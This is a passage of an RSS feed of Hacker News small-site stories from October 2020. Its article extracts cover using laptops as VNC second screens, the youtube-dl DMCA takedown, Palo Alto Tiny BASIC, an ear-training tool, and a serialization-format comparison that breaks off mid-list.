<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 50]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 50. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 25 Oct 2020 16:39:43 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-50.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 25 Oct 2020 16:39:43 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Old Laptops as Secondary Monitors]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 17 (<a href="https://news.ycombinator.com/item?id=24875533">thread link</a>) | @HaoZeke
<br/>
October 23, 2020 | https://rgoswami.me/posts/laptop-as-second-screens/ | <a href="https://web.archive.org/web/*/https://rgoswami.me/posts/laptop-as-second-screens/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Dual screen workflows without screens across operating systems</p></blockquote><h2 id="background">Background</h2><p>My X380 sadly has been having port issues. This meant that my M14 was no longer a viable option for my second screen needs.</p><h2 id="outline">Outline</h2><p>The general form of the solution works in one of two ways:</p><dl><dt>VNC Viewer</dt><dd>Where the (second-screen) laptop connects to a VNC server on the primary laptop</dd><dt>Peripheral Shares</dt><dd>Where the secondary laptop runs a server to enable proxying mouse and keyboard access from the primary laptop</dd></dl><h2 id="vnc-and-windows">VNC and Windows</h2><p>For laptops running Windows, I personally just set up <a href="https://tightvnc.com/">TightVNC</a>. The standard settings work well enough for the peripheral share described below.</p><p>This is best used for working with Windows only stuff like Office.</p><h2 id="vnc-and-linux">VNC and Linux</h2><p>For the secondary laptop we need to run a server (<code>tigervnc</code>) without setting an external screen.</p><div><pre><code data-lang="bash">x0vncserver -rfbauth ~/.vnc/passwd
</code></pre></div><p>Now on the main laptop, we will simply leverage <code>x2vnc</code> to extend into the secondary laptop.</p><p>Where we can get the IP (local) by checking with <code>ifconfig</code> on the secondary laptop.</p><h4 id="meta">Meta</h4><p>This works best when combined with a networked file-system, since then you can interact with files in tandem. Otherwise, there is quite a bit of <code>git</code> based back and forth.</p><h2 id="vnc-and-android">VNC and Android</h2><p>There are two parts to this solution. Note that, as Android devices don’t run X11 systems in a meaningful way, the direct access method is through a paid application, a2vnc server lite, which also did not work well in my tests. We will therefore focus on setting a VNC viewer up to connect to the primary laptop.</p><h3 id="primary-settings">Primary Settings</h3><h4 id="xrandr-setup">XRandR Setup</h4><p>For the primary laptop, we will start by obtaining our present screens configuration.</p><div><pre><code data-lang="bash">xrandr <span>|</span> grep <span>" connected"</span>
</code></pre></div><div><pre><code data-lang="bash">eDP1 connected primary 1920x1080+1920+0 <span>(</span>normal left inverted right x axis y axis<span>)</span> 290mm x 170mm
</code></pre></div><p>Naturally your output will differ. We also need the resolution of the Android device. In my case, they are the same. At this point we are ready to figure out the mode-line.</p><div><pre><code data-lang="bash"><span># 1920x1080 @ 60.00 Hz (GTF) hsync: 67.08 kHz; pclk: 172.80 MHz</span>
Modeline <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Let us now use this information to create a bunch of modelines.</p><div><pre><code data-lang="bash">xrandr --newmode <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Note that we can create more of these in the same manner. We can now move forward with making a virtual screen.</p><div><pre><code data-lang="bash">xrandr --addmode VIRTUAL1 1920x1080_60.00
</code></pre></div><p>We can now finally set up the output.</p><div><pre><code data-lang="bash">xrandr --output VIRTUAL1 --mode 1920x1080_60.00 --left-of eDP1
</code></pre></div><p>Note that it is better to use <code>mons</code> to work with our newly created virtual screen.</p><p>This is still a bit ugly, since the process needs to be repeated with each reboot.</p><h4 id="vnc-setup">VNC Setup</h4><p>Now we need prepare our VNC. <code>x11vnc</code> is recommended at the moment.</p><div><pre><code data-lang="bash">x11vnc -vencrypt nodh:only-ssl -ssl SAVE -clip 1920x1080+0+0
</code></pre></div><h3 id="android-settings">Android Settings</h3><p>For this section, I personally use <a href="https://play.google.com/store/apps/details?id=com.iiordanov.bVNC&amp;hl=en&amp;gl=US">bVNC Pro</a>. The setup is pretty dead simple. A basic VNC connection is all that is required.</p><p>In practice, I use the x86 setup, with the secondary laptop acting as a viewer for a virtual screen, mostly because that way I can tune into multiple Zoom meetings (a bonus).</p><h2 id="conclusion">Conclusion</h2><p>The final setup is quite robust to changes. Future posts might go into setting up the kind of local networking tools to help move files, code and more between both machines, to improve on the peripheral share approach. Additionally, there are still some manual steps which can and should be automated. I’m not super pleased with the setup, it takes longer than a wireless sceen</p></div></div>]]>
            </description>
            <link>https://rgoswami.me/posts/laptop-as-second-screens/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24875533</guid>
            <pubDate>Fri, 23 Oct 2020 23:33:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The YouTube-DL Takedown]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24873805">thread link</a>) | @resynth1943
<br/>
October 23, 2020 | https://resynth1943.net/articles/youtube-dl-takedown/ | <a href="https://web.archive.org/web/*/https://resynth1943.net/articles/youtube-dl-takedown/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="content">
		
		<p>GitHub has removed the ability to access youtube-dl's source code due to a DMCA.</p>

		<p>On the 23rd of October, GitHub received a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA</a> against the youtube-dl authors, claiming the software infringed copyright Laws. While I fundamentally disagree with this, let's talk more about it.</p>
<p>First off, it should go without saying that this source code needs to be held elsewhere, outside of the control of GitHub or GitLab. We've seen an increasing amount of <a href="https://github.com/github/dmca/tree/master/2020/10">Cease and Desist</a> notices being sent to GitHub, with a staggering 124 (!) in October of 2020.</p>
<p>Secondly, copyright claims such as these are harmful to genuine software development. While these claims do hold some truth, some say it is fundamentally <em>unjust</em> to prevent access to an educational source code repository.</p>
<p>In light of distributed source code hosting platforms such as Git, thousands of developers have the public domain youtube-dl source code stored <em>locally</em>, hence the claim to remove the source code is impossible.</p>
<p>Nevertheless, there are still ways to access this source code. For starters, the <code>youtube-dl</code> module is still available on <a href="https://pypi.org/project/youtube_dl/">PyPi</a>, a package hosting platform for Python. Also, <a href="https://gitee.com/mirrors/youtube-downloader">Gitee (a Chinese Git platform)</a> contains a copy of youtube-dl in its entirety.</p>
<p>I would encourage you all to create mirrors on alternative Git hosting platforms. I'm more than happy to update this article with any further information.</p>


		<!-- Doing a little experiment here. -->
		<p aria-disabled="true">resynth1943.article</p>
	</div></div>]]>
            </description>
            <link>https://resynth1943.net/articles/youtube-dl-takedown/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873805</guid>
            <pubDate>Fri, 23 Oct 2020 20:35:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Palo Alto Tiny BASIC in the Browser]]>
            </title>
            <description>
<![CDATA[
Score 76 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24873472">thread link</a>) | @tosh
<br/>
October 23, 2020 | http://troypress.com/palo-alto-tiny-basic-in-your-browser/ | <a href="https://web.archive.org/web/*/http://troypress.com/palo-alto-tiny-basic-in-your-browser/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
				




<p><a href="https://maly.cz/">Martin Malý</a> has adapted Version 2 of Li Chen Wang’s <a href="https://en.wikipedia.org/wiki/Tiny_BASIC#Palo_Alto_Tiny_BASIC">Palo Alto Tiny BASIC</a> to run on his <a href="https://www.asm80.com/">ASM80</a> browser-based assembler and emulator. I’ve uploaded <a href="https://github.com/Geddd/PATB4ASM80">the source code</a>, with his permission, to GitHub.</p>



<p><strong>Background</strong></p>



<p>Palo Alto Tiny BASIC emerged out of the Tiny BASIC movement started by People’s Computer Company and taken up by the Homebrew Computer Club. Fellow members Steve Wozniak and Tom Pittman would develop their own BASICs (Integer BASIC and 6800 Tiny BASIC respectively). Wang analyzed the Altair BASIC code and contributed edits to Tiny BASIC Extended. Wang published in the newsletter a loader for the 8080, commenting on the <em>Open Letter to Hobbyists:</em></p>



<blockquote><p>Altair Basic has a bootstrap loader of twenty or twenty one bytes long. In principle, you can use this bootstrap to load in your own loader which will then load in your program. However, since Mr. Bill Gates claims that he did not yet payed [sic] enough and is in the mood of calling people thieves. (See HBCC newsletter ’12-1.) I decided to code one myself. What comes out is a bootstrap of sixteen bytes long. This is still too long, maybe our professional experts can make it shorter. For the time being you are welcome to copy mine and I will not call you a thief (this includes Mr. Gates).</p></blockquote>



<p>No surprise then that Li Chen Wang made his BASIC implementation available for free. (I found this quote reading old Homebrew newsletter articles in my research for the <a href="http://troypress.com/basic-interpreters-new-wikipedia-article/" data-type="post" data-id="853">BASIC interpreter article</a>.)</p>



<p>The only smaller implementation of Tiny BASIC was <a href="http://troypress.com/the-dialects-of-tiny-basic/" data-type="post" data-id="878">MINOL</a>, which used unsigned bytes instead of signed integers and which used nonstandard commands. Also weighing in under 2kB, when a common method of shipping interpreters was 4kB ROMs, Palo Alto Tiny BASIC supported a more typical version of the language while leaving extensive room for customization for specific hardware, something which was taken advantage of multiple times, for the TRS-80, the <a href="http://troypress.com/astro-basic/" data-type="post" data-id="867">Bally Astrocade</a>, the Sharp PC-1211, and the Cromemco.</p>



<p><strong>The Code</strong></p>



<p>It’s been fun to play with the source code that was behind three of the computers I used as a kid. Some things I learnt:</p>



<ul><li>The code is very well structured and extensible. I added a few commands in under an hour (<em>PEEK, FRE()</em>). All you need to do is insert new commands in the keyword table, then adapt code elsewhere.</li><li>I was very excited to find a few small bugs in the code:<ul><li>The system famously had only three error messages (“WHAT?” for syntax errors, “HOW?” for functional errors, and “SORRY” for capacity issues). If you execute a <em>RETURN</em> with no corresponding <em>GOSUB</em> you get a &nbsp;“WHAT?” instead of a “HOW?”</li></ul><ul><li><em>10 INPUT “HELLO WORLD” </em>acts like a valid <em>PRINT</em> statement when it should cause a syntax error, since no variable is specified to receive the input.</li></ul><ul><li>The language only supports integers, but decimals aren’t ignored as they should be. <em>PRINT 1.1, 1.2</em> outputs <em>1</em> and <em>0</em>.</li></ul></li><li>There’s an Easter egg! “W”, “AN”, “G”</li></ul>



<figure><img data-attachment-id="904" data-permalink="http://troypress.com/palo-alto-tiny-basic-in-your-browser/image-5/" data-orig-file="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?fit=379%2C329" data-orig-size="379,329" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-medium-file="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?fit=300%2C260" data-large-file="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?fit=379%2C329" loading="lazy" width="379" height="329" src="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?resize=379%2C329" alt="" srcset="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?w=379 379w, https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?resize=300%2C260 300w" sizes="(max-width: 379px) 100vw, 379px" data-recalc-dims="1"></figure>



<p><strong>RST 1 Routine</strong></p>



<p>The RST 1 routine is a work of art, using the call stack to determine where its parameters are, with the byte after RST 1 specifying the character to match and the byte after that specifying the offset to jump to. Wang’s ability to write such memory-efficient code is why he didn’t need to implement the <a href="http://troypress.com/the-tiny-basic-interpretive-language-il-and-onions/" data-type="post" data-id="249">IL virtual machine</a>.</p>



<figure><img data-attachment-id="905" data-permalink="http://troypress.com/palo-alto-tiny-basic-in-your-browser/image-1-2/" data-orig-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?fit=407%2C60" data-orig-size="407,60" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?fit=300%2C44" data-large-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?fit=407%2C60" loading="lazy" width="407" height="60" src="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?resize=407%2C60" alt="" srcset="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?w=407 407w, https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?resize=300%2C44 300w" sizes="(max-width: 407px) 100vw, 407px" data-recalc-dims="1"></figure>



<figure><img data-attachment-id="906" data-permalink="http://troypress.com/palo-alto-tiny-basic-in-your-browser/image-2-2/" data-orig-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?fit=468%2C203" data-orig-size="468,203" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?fit=300%2C130" data-large-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?fit=468%2C203" loading="lazy" width="468" height="203" src="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?resize=468%2C203" alt="" srcset="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?w=468 468w, https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?resize=300%2C130 300w" sizes="(max-width: 468px) 100vw, 468px" data-recalc-dims="1"></figure>



<p>I encourage you to check out the <a href="https://github.com/Geddd/PATB4ASM80">source code</a> for yourself.</p>

		
		</div></div>]]>
            </description>
            <link>http://troypress.com/palo-alto-tiny-basic-in-your-browser/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873472</guid>
            <pubDate>Fri, 23 Oct 2020 20:09:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Perfect Pitch Ear Training]]>
            </title>
            <description>
<![CDATA[
Score 142 | Comments 124 (<a href="https://news.ycombinator.com/item?id=24872754">thread link</a>) | @sergeykish
<br/>
October 23, 2020 | http://sergeykish.com/perfect-pitch-ear-training | <a href="https://web.archive.org/web/*/http://sergeykish.com/perfect-pitch-ear-training">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>I do not perceive notes in different octaves as same, this makes <a href="https://tonedear.com/ear-training/absolute-perfect-pitch-test">Toned Ear pitch training</a> guesswork. So I've created a tool where one can select individual notes:<br></p><table id="available"><tbody><tr><th>Bâ™¯/C</th><td><label for="C3">3</label></td><td><label for="C4">4</label></td><td><label for="C5">5</label></td></tr><tr><th>Câ™¯/Dâ™­</th><td><label for="C#3">3</label></td><td><label for="C#4">4</label></td><td><label for="C#5">5</label></td></tr><tr><th>D</th><td><label for="D3">3</label></td><td><label for="D4">4</label></td><td><label for="D5">5</label></td></tr><tr><th>Dâ™¯/Eâ™­</th><td><label for="D#3">3</label></td><td><label for="D#4">4</label></td><td><label for="D#5">5</label></td></tr><tr><th>E/Fâ™­</th><td><label for="E3">3</label></td><td><label for="E4">4</label></td><td><label for="E5">5</label></td></tr><tr><th>F</th><td><label for="F3">3</label></td><td><label for="F4">4</label></td><td><label for="F5">5</label></td></tr><tr><th>Fâ™¯/Gâ™­</th><td><label for="F#3">3</label></td><td><label for="F#4">4</label></td><td><label for="F#5">5</label></td></tr><tr><th>G</th><td><label for="G3">3</label></td><td><label for="G4">4</label></td><td><label for="G5">5</label></td></tr><tr><th>Gâ™¯/Aâ™­</th><td><label for="G#3">3</label></td><td><label for="G#4">4</label></td><td><label for="G#5">5</label></td></tr><tr><th>A</th><td><label for="A3">3</label></td><td><label for="A4">4</label></td><td><label for="A5">5</label></td></tr><tr><th>Aâ™¯/Bâ™­</th><td><label for="A#3">3</label></td><td><label for="A#4">4</label></td><td><label for="A#5">5</label></td></tr><tr><th>B/Câ™­</th><td><label for="B3">3</label></td><td><label for="B4">4</label></td><td><label for="B5">5</label></td>
</tr></tbody></table><p>Now run , it randomly selects note and plays it. Select answer <span id="answers">, , , , , , , , , , , </span>, if wrong it plays note second time so you can make another try. Or you can  selected note again.</p><p>Correct answer increases counter <span id="counterLabel">0</span>, incorrect resets it to zero. Buttons has keyboard shortcuts, corresponding key marked by underline. For example type <span>t</span> to run "<u>T</u>est",  <span>c</span> to answer "<u>C</u>", <kbd>Shift</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™¯</u>" and <kbd>Alt</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™­</u>" (not sure how it would work in Safari).</p><p>I think the way to go is making strong connections between sound and its name. Knowing not guessing. I've started with just two notes â€” G3 and C4. I close my eyes and go through hundreds of tests. Once I felt confident I've added G4, than C5.</p><p>TODO:</p><ul><li>store configuration in URL hash<br></li><li>select instrument</li><li>store instruments on server</li></ul><p>UPDATES:</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioContext">window.webkitAudioContext</a> for Safari</li><li>buttons to answer sharps and flats</li><li>mark incorrect answer with color</li><li><code>accesskey</code> replaced by <code>document.onkeydown</code></li></ul><p>Implementation:</p> </div>]]>
            </description>
            <link>http://sergeykish.com/perfect-pitch-ear-training</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872754</guid>
            <pubDate>Fri, 23 Oct 2020 19:08:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The 'education bubble' is not merely a financial crisis; it is a moral crisis]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 20 (<a href="https://news.ycombinator.com/item?id=24872331">thread link</a>) | @lawschool333
<br/>
October 23, 2020 | https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88 | <a href="https://web.archive.org/web/*/https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872331</guid>
            <pubDate>Fri, 23 Oct 2020 18:25:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Better Than JSON?]]>
            </title>
            <description>
<![CDATA[
Score 122 | Comments 138 (<a href="https://news.ycombinator.com/item?id=24871946">thread link</a>) | @fanf2
<br/>
October 23, 2020 | https://wiki.alopex.li/BetterThanJson | <a href="https://web.archive.org/web/*/https://wiki.alopex.li/BetterThanJson">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">

<p>I want to take a brief look at various data serialization formats and compare them. Basically the goal is to answer the question, “can we find something better than JSON?” However, note that we are looking at these things for DATA SERIALIZATION, not for config files and stuff, so that’s the goal by which these will be judged.</p>
<p>There’s two orthogonal axes to look at these things under:</p>
<ul>
<li>Self-describing vs.&nbsp;schema-defined formats</li>
<li>Human readable vs.&nbsp;machine-readable formats</li>
</ul>
<p>That is, whether the type information for a structure is defined in a separate file (a schema) that a receiving program checks against, or whether the message itself contains type information. It’s almost exactly the difference between statically and dynamically typed programming languages. Like programming languages, both have pros and cons, neither of them are always better than the other. The goal of this is to compare apples to apples, so we’re gonna note which category these things fall into but not make value judgements based on them. There’s also fuzzy edges; many self-describing formats optionally have a schema layer too. Similarly, we will not really compare tooling quality; the goal is to look at the intrinsic properties of the formats. The culture surrounding them may be considered though.</p>
<p>This is also important not to conflate with an RPC protocol, though many of these things are used IN RPC protocols. Keep in mind that HTTP/REST interfaces are often just a type of RPC protocol, whether realized that way or not.</p>
<p>Up to date as of October 2020. Doesn’t try to include myriad minor things, ’cause there’s only so much time in the world.</p>

<h2 id="json">JSON</h2>
<p><a href="http://json.org/">http://json.org/</a></p>
<p>What everything gets currently compared against. We all know JSON, we all agree it’s Sorta Good Enough but really is kinda crap.</p>
<p><strong>Category:</strong> Human-readable, self-describing. (<a href="https://json-schema.org/">https://json-schema.org/</a> exists but does not seem very widely used.) Has an <a href="https://en.wikipedia.org/wiki/JSON-RPC">RPC protocol</a> but it also seems lightly used, <a href="https://jsonapi.org/">this</a> might be more general.</p>
<p><strong>Users:</strong> Everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Similar to major programming languages – Easy to understand and debug</li>
<li>Simple – Easy to read, write, and understand… at least for simple things. <a href="http://seriot.ch/parsing_json.php">Turns out there’s a lot of gotcha’s though.</a></li>
<li>Pretty compact if minified</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is pretty shit – no date/time, no real integers, no real structs, no unions/tuples/etc</li>
<li>Tends to discourage schema’s – “So simple it doesn’t need it”, until it becomes less simple.</li>
<li>No normalized form – fields may be reordered, <em>duplicated</em>, etc. Makes hashing it hard, gotta read whole message to begin verifying it, etc.</li>
<li>No comments – harder to write well than you might think!</li>
<li>No good way to contain binary data</li>
</ul>
<h2 id="yaml">YAML</h2>
<p><a href="https://yaml.org/">https://yaml.org/</a></p>
<p>Started out as a simpler alternative to XML.</p>
<p><strong>Category:</strong> Human-readable, self-describing.</p>
<p><strong>Users:</strong> Lots of people</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Vaguely simple to read and write, in its basic form</li>
<li>Low visual noise</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Way too complicated – they made it a strict superset of JSON for some damn reason, and nobody uses that form, so it’s just a pile of wasted effort</li>
<li>Reference impl incomplete, other impl’s disagree with each other and the spec</li>
</ul>
<h2 id="xml">XML</h2>
<p><a href="https://en.wikipedia.org/wiki/XML">https://en.wikipedia.org/wiki/XML</a></p>
<p>Not sure anyone really knows how XML happened. It’s basically the W3C’s fault, I think? It’s okay for some things but in the end I’m not sure it’s something anyone actually <em>wants</em> to use, it’s just going to be one more of those mistakes of the past.</p>
<p><strong>Category:</strong> Human-readable, self-describing with common schema usage. Has an <a href="https://en.wikipedia.org/wiki/XML-RPC">RPC protocol</a> and many other complicated things.</p>
<p><strong>Users:</strong> Everyone who can’t avoid it.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Promotes schemas and validation</li>
<li>Simple to use for simple things</li>
<li>Actually pretty decent for documents</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>I’ve never gotten schemas and validation to actually work in practice</li>
<li>Everything is string-ly typed</li>
<li>No real arrays</li>
<li>Complicated as frig</li>
<li>Very verbose</li>
<li>There’s like 3-4 different ways to do everything</li>
<li>Still no good way to contain binary data</li>
</ul>

<h2 id="protobuf">Protobuf</h2>
<p><a href="https://developers.google.com/protocol-buffers/">https://developers.google.com/protocol-buffers/</a></p>
<p>aka Protocol Buffers, but that’s a pretty dumb name. Google’s common, fast on-the-wire serialization format.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Has an <a href="https://grpc.io/">RPC protocol</a> built around it.</p>
<p><strong>Users:</strong> Google, basically everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Basically reasonable</li>
<li>Now has some support for versioning schemas, though it’s a hard problem in general</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Not particularly simple</li>
<li>Wire protocol may be more work than it needs to be</li>
<li>Its type system <a href="http://reasonablypolymorphic.com/blog/protos-are-wrong/index.html">could maybe be better</a></li>
</ul>
<h2 id="capn-proto">Cap’n Proto</h2>
<p><a href="https://capnproto.org/">https://capnproto.org/</a></p>
<p>The Other Binary Serialization Protocol.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC, which is built in to the reference implementation.</p>
<p><strong>Users:</strong> sandstorm.io, Cloudflare?, various other people but it doesn’t seem like that many</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed to be fast</li>
<li>Made by one of the people who worked heavily on Protobuf at Google, so <a href="https://capnproto.org/faq.html#how-do-i-make-a-field-required-like-in-protocol-buffers">there’s lots of experience behind it</a>. That said, doesn’t mean this cat’s always <em>right</em>, but there’s certainly opinions that are trying to be expressed.</li>
<li>Sophisticated RPC comes as part of the standard package</li>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
<li>Adorable name</li>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
<li>Lots of the docs and concepts are pretty low level, you usually ain’t gonna need it</li>
<li>Seems more complicated than protobuf – this might be one reason there’s fewer 3rd-party implementations</li>
</ul>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/">https://thrift.apache.org/</a></p>
<p>Apache’s version of Protobuf. Does anyone actually use this? Facebook, apparently, since they invented it and then gave it to Apache. Anyone else?</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC.</p>
<p><strong>Users:</strong> Basically mostly Facebook? Twitter and AirBNB also apparently use it, so apparently it’s not UNpopular.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>It works?</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Docs suck</li>
<li>Apache is the tragic junkyard of open source projects</li>
<li>Apparently still not as good as flatbuffers, see below</li>
</ul>
<h2 id="flatbuffers">Flatbuffers</h2>
<p><a href="https://google.github.io/flatbuffers/">https://google.github.io/flatbuffers/</a></p>
<p>Feels a little like Google’s answer to Cap’n Proto, as it has some of the same design goals – zero-copy serialization and layouts that are more amenable to versioning.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Includes RPC protocol.</p>
<p><strong>Users:</strong> Google, Cocos2D, Facebook’s mobile client</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda feels like the problem is already solved by capnp</li>
<li>Includes a JSON parser for some reason?</li>
<li>Type system is kinda anemic with regards to unions</li>
</ul>
<h2 id="cbor">CBOR</h2>
<p><a href="https://cbor.io/">https://cbor.io/</a></p>
<p>Basically a binary re-imagining of JSON.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> ???</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Pretty good type system – there’s things like fixnum’s, datetime’s, blobs, etc</li>
<li>Compact</li>
<li>Built-in extensibility</li>
<li>Designed to be a drop-in replacement for JSON</li>
<li>IETF standard</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda more complicated than it needs to be, though this is for the sake of compactness and comprehensive types. Numbers are densely packed into fewer bits when possible, for example.</li>
<li>Doesn’t actually seem that widely adopted for some reason?</li>
</ul>
<h2 id="msgpack">Msgpack</h2>
<p><a href="https://msgpack.org/">https://msgpack.org/</a></p>
<p>The Other CBOR, or rather, <a href="https://news.ycombinator.com/item?id=14067747">CBOR is derived from this</a>. Designed to be simple and compact. Kinda a <em>lot</em> like a slightly chopped down CBOR, actually, their integer specification stuff looks nearly identical.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> Redis, a few others?</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple</li>
<li>Compact</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Specification is kinda weak</li>
<li>No real tuple or enum types</li>
<li>Why not just CBOR?</li>
</ul>
<h2 id="bson">BSON</h2>
<p><a href="http://bsonspec.org/">http://bsonspec.org/</a></p>
<p>As the name implies, a binary-ifcation of JSON. Created by MongoDB as its internal data format.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> MongoDB</p>
<p><strong>Pros:</strong></p>
<ul>
